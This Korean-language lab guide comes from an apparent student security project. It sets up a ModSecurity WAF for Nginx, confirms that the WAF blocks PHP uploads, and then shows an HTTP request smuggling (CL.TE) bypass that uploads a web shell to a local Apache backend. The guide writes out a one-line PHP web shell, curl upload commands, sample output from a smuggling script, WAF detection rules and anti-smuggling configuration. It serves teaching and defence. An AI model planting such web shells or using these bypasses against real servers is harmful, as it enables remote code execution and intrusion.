# 🛡️ ModSecurity WAF 설치 및 테스트 가이드

## 🎯 목표

**Nginx에 ModSecurity WAF를 추가하여 일반 업로드를 차단하지만, Request Smuggling으로는 우회 가능함을 증명**

---

## 📋 변경사항 요약

### 1. Docker Image 변경
```yaml
# 기존
image: nginx:1.21.0

# 변경
image: owasp/modsecurity-crs:nginx-alpine
```

### 2. 추가 파일
- `nginx_waf.conf` - ModSecurity가 활성화된 Nginx 설정
- `modsecurity_custom.conf` - 커스텀 WAF 규칙 (12개 규칙)

---

## 🚀 Step 1: WAF 적용

### 기존 Nginx 중지
```bash
cd c:/Users/User/Documents/GitHub/HyundaiAutoever_ITsecurity_project4/website2

# 기존 컨테이너 중지
docker-compose down
```

### Docker Compose 재시작
```bash
# ModSecurity WAF 이미지로 재시작
docker-compose up -d

# 컨테이너 확인
docker ps | grep nginx
```

**예상 출력**:
```
1xinv_nginx_waf   owasp/modsecurity-crs:nginx-alpine   포트 9000
```

### WAF 동작 확인
```bash
# ModSecurity 설정 확인
docker exec 1xinv_nginx_waf cat /etc/modsecurity.d/modsecurity.conf | grep SecRuleEngine

# 커스텀 규칙 확인
docker exec 1xinv_nginx_waf cat /etc/modsecurity.d/owasp-crs/rules/custom.conf
```

---

## 🧪 Step 2: 일반 업로드 테스트 (WAF 차단 확인)

### 테스트 1: PHP 파일 업로드 시도

```bash
# PHP 웹쉘 생성
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 업로드 시도
curl -v -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@shell.php"
```

**예상 결과**:
```
< HTTP/1.1 403 Forbidden
< Server: nginx
<
ModSecurity: Access denied with code 403 (phase 2).
Pattern match "\.php$" at FILES_NAMES.
[file "/etc/modsecurity.d/owasp-crs/rules/custom.conf"]
[line "35"] [id "999004"]
[msg "PHP File Upload Blocked"]
```

**WAF 규칙**: Rule 999004 (PHP 파일 확장자 차단)

---

### 테스트 2: 악성 파일명 시도

```bash
# 파일명을 backdoor.jpg로 변경
echo '<?php system($_GET["cmd"]); ?>' > backdoor.jpg

curl -v -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@backdoor.jpg"
```

**예상 결과**:
```
< HTTP/1.1 403 Forbidden
<
ModSecurity: Access denied with code 403 (phase 2).
Pattern match "(?i)(?:shell|backdoor|webshell)" at FILES_NAMES.
[id "999003"] [msg "Malicious Filename Detected in Upload"]
```

**WAF 규칙**: Rule 999003 (악성 파일명 탐지)

---

### 테스트 3: PHP 코드 패턴 탐지

```bash
# 정상 파일명이지만 코드가 악성
echo '<?php system($_GET["cmd"]); ?>' > image.jpg

curl -v -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@image.jpg"
```

**예상 결과**:
```
< HTTP/1.1 403 Forbidden
<
ModSecurity: Access denied with code 403 (phase 2).
Pattern match "(?:system|exec|passthru)" at REQUEST_BODY.
[id "999001"] [msg "PHP Code Execution Function Detected"]
```

**WAF 규칙**: Rule 999001 (PHP 실행 함수 탐지)

---

### 테스트 4: Rate Limiting

```bash
# 15번 연속 요청
for i in {1..15}; do
  echo "Request $i"
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:9000/api/submit_inquiry.php \
    -F "name=test" \
    -F "email=test@test.com" \
    -F "phone=010-1234-5678" \
    -F "category=technical" \
    -F "subject=test" \
    -F "message=test" \
    -F "image=@image.jpg"
  sleep 0.5
done
```

**예상 결과**:
```
Request 1-10: 200 (또는 403 - 파일명에 따라)
Request 11-15: 403 (Rate Limit Exceeded)
```

**WAF 규칙**: Rule 999010-999011 (60초에 10번 제한)

---

## ✅ Step 3: Request Smuggling으로 WAF 우회

### Python 스크립트 실행

```bash
# Smuggling 공격
python3 smuggle_webshell.py backdoor.php
```

**예상 결과**:
```
============================================================
  HTTP Request Smuggling - Webshell Upload
  CL.TE Attack (Nginx → Apache)
============================================================

[*] Target: localhost:9000
[*] Shell name: backdoor.php

[+] Smuggled request size: 687 bytes
[*] Connecting to server...
[+] Connected!

[*] Sending CL.TE smuggling payload...
[+] Payload sent!

[*] Waiting for response 1 (POST /)...
[+] Response 1 received (200 OK)

[*] Sending normal request to trigger smuggled payload...
[*] Waiting for response 2 (smuggled POST)...

[+] ✅ Webshell uploaded successfully!
[+] Server response: {"success":true,"message":"문의가 성공적으로 접수되었습니다.","inquiry_id":8,"image_path":"uploads/backdoor.php"}

[+] Webshell URL: http://localhost:9000/uploads/backdoor.php

[*] Testing webshell...
[+] ✅ Webshell is working!
[+] Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**성공 이유**:
1. Nginx WAF는 `POST /`만 보고 검사 안 함
2. smuggled 요청의 `backdoor.php`, `system()` 등을 파싱하지 못함
3. Apache가 직접 받아서 처리 → 업로드 성공

---

## 🔍 Step 4: 로그 분석

### Nginx Access Log (2개 요청만 기록)

```bash
docker exec 1xinv_nginx_waf tail -20 /var/log/nginx/access.log
```

**출력**:
```
172.18.0.1 - - [20/Oct/2025:12:00:00 +0900] "POST / HTTP/1.1" 200 4799
172.18.0.1 - - [20/Oct/2025:12:00:01 +0900] "GET /index.php HTTP/1.1" 200 4799
```

**분석**: `/api/submit_inquiry.php`가 없음 → WAF가 검사하지 못함

---

### ModSecurity Audit Log (아무 기록 없음)

```bash
docker exec 1xinv_nginx_waf tail -50 /var/log/modsec_audit.log
```

**출력**: (비어있음 또는 `POST /`만 기록)

**분석**: Smuggled 요청이 ModSecurity를 우회함

---

### Apache Access Log (3개 요청 기록!)

```bash
docker exec 1xinv_web_v2 tail -20 /var/log/apache2/access.log
```

**출력**:
```
172.19.0.5 - - [20/Oct/2025:03:00:00 +0000] "POST / HTTP/1.1" 200 4799
172.19.0.5 - - [20/Oct/2025:03:00:01 +0000] "POST /api/submit_inquiry.php HTTP/1.1" 200 147  ← Smuggled!
172.19.0.5 - - [20/Oct/2025:03:00:01 +0000] "GET /index.php HTTP/1.1" 200 4799
```

**분석**: Apache는 3개 요청 기록 → Smuggling 성공 증거!

---

## 📊 테스트 결과 비교

| 테스트 항목 | 일반 업로드 | Smuggling 업로드 |
|-----------|-----------|----------------|
| **PHP 파일 (.php)** | ❌ 차단 (Rule 999004) | ✅ 우회 성공 |
| **악성 파일명 (backdoor)** | ❌ 차단 (Rule 999003) | ✅ 우회 성공 |
| **PHP 코드 (system)** | ❌ 차단 (Rule 999001) | ✅ 우회 성공 |
| **Rate Limit** | ❌ 제한됨 (10번/분) | ✅ 무제한 |
| **Nginx 로그** | ✅ 명확히 기록 | ⚠️ POST /만 기록 |
| **ModSec Audit Log** | ✅ 차단 기록 | ❌ 기록 없음 |
| **Apache 로그** | ✅ 기록 | ✅ 기록 (Smuggled) |

---

## 🎯 WAF 규칙 요약

| Rule ID | 규칙 이름 | 차단 대상 | 심각도 |
|---------|---------|----------|--------|
| 999001 | PHP 실행 함수 탐지 | system(), exec(), eval() 등 | CRITICAL |
| 999002 | PHP 슈퍼글로벌 | $_GET, $_POST, $_REQUEST | WARNING |
| 999003 | 악성 파일명 | shell, backdoor, webshell, cmd | CRITICAL |
| 999004 | PHP 확장자 차단 | .php, .phtml, .php3-5 | CRITICAL |
| 999005 | PHP 코드 내용 | 파일 내 PHP 코드 | CRITICAL |
| 999006 | PHP 태그 | <?php, <?= | CRITICAL |
| 999007 | 파일 크기 | 5MB 초과 | WARNING |
| 999008 | SQL Injection | SQLi 패턴 | CRITICAL |
| 999009 | XSS | XSS 패턴 | WARNING |
| 999010-11 | Rate Limit | 60초에 10번 초과 | WARNING |

---

## 🛡️ 추가 보안 강화

### 완전한 Request Smuggling 방어

```nginx
# nginx_waf.conf에 추가
server {
    # Transfer-Encoding 헤더 감지 시 거부
    if ($http_transfer_encoding != "") {
        return 400 "Transfer-Encoding not allowed";
    }

    # Content-Length와 Transfer-Encoding 동시 존재 시 거부
    set $smuggling_check 0;
    if ($http_transfer_encoding != "") {
        set $smuggling_check 1;
    }
    if ($http_content_length != "") {
        set $smuggling_check "${smuggling_check}2";
    }
    if ($smuggling_check = "12") {
        return 400 "Potential Request Smuggling detected";
    }
}
```

### ModSecurity 규칙 추가

```apache
# modsecurity_custom.conf에 추가

# Transfer-Encoding 헤더 차단
SecRule REQUEST_HEADERS:Transfer-Encoding "!@rx ^$" \
    "id:999020,\
    phase:1,\
    block,\
    log,\
    msg:'Transfer-Encoding Header Blocked',\
    severity:CRITICAL"
```

---

## 🎓 학습 포인트

### 1. WAF는 완벽하지 않다
- ModSecurity + OWASP CRS도 Request Smuggling 우회 가능
- HTTP 파싱 불일치가 근본 원인

### 2. 다층 방어가 필요하다
- WAF만으로는 부족
- 백엔드 검증 + 네트워크 보안 + 로깅 필요

### 3. Request Smuggling의 위험성
- 프론트엔드 보안 ≠ 전체 보안
- End-to-End 보안 검증 필수

---

## 📁 관련 파일

- [docker-compose.yml](docker-compose.yml) - WAF 이미지 설정
- [nginx_waf.conf](nginx_waf.conf) - ModSecurity 활성화된 Nginx 설정
- [modsecurity_custom.conf](modsecurity_custom.conf) - 커스텀 WAF 규칙
- [SECURITY_ANALYSIS.md](SECURITY_ANALYSIS.md) - 전체 보안 분석
- [smuggle_webshell.py](smuggle_webshell.py) - Smuggling 공격 스크립트

---

**⚠️ 주의**: 이 설정은 교육 목적으로 의도적으로 취약하게 구성되었습니다. 프로덕션 환경에서는 절대 사용하지 마세요!
